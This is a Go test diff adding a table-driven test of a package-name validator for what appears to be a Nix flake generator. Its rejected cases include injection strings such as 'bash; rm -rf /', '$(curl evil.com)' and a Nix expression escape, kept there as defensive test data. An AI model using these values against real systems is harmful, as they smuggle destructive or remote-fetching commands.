@@ -117,6 +117,38 @@ func TestCacheKey(t *testing.T) {
 	}
 }
 
+func TestValidPackageName(t *testing.T) {
+	tests := []struct {
+		pkg  string
+		want bool
+	}{
+		{"bash", true},
+		{"python3Packages.pandas", true},
+		{"haskellPackages.ghc", true},
+		{"lua5_4Packages.dkjson", true},
+		{"rubyPackages.pry", true},
+		{"my-package", true},
+		{"pkg_v2", true},
+		{"a1", true},
+		{"", false},
+		{".bash", false},
+		{"-bash", false},
+		{"bash]; builtins.abort \"pwned\"; pkgs.bash", false},
+		{"bash\noops", false},
+		{"bash$(evil)", false},
+		{"bash; rm -rf /", false},
+		{"bash`evil`", false},
+		{"$(curl evil.com)", false},
+	}
+
+	for _, tt := range tests {
+		got := validPackageName(tt.pkg)
+		if got != tt.want {
+			t.Errorf("validPackageName(%q) = %v, want %v", tt.pkg, got, tt.want)
+		}
+	}
+}
+
 func TestGenerateFlake(t *testing.T) {
 	t.Run("default", func(t *testing.T) {
 		flake := generateFlake(
